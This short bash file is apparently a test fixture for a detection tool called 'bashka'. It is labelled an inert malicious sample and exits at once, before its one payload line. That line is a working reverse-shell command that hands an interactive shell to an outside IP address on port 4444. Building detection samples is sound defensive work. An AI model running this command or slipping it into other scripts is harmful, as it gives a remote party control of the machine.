#!/bin/bash
# INERT malicious sample for bashka detection testing. Do not run.
exit 0
bash -i >& /dev/tcp/185.243.115.9/4444 0>&1
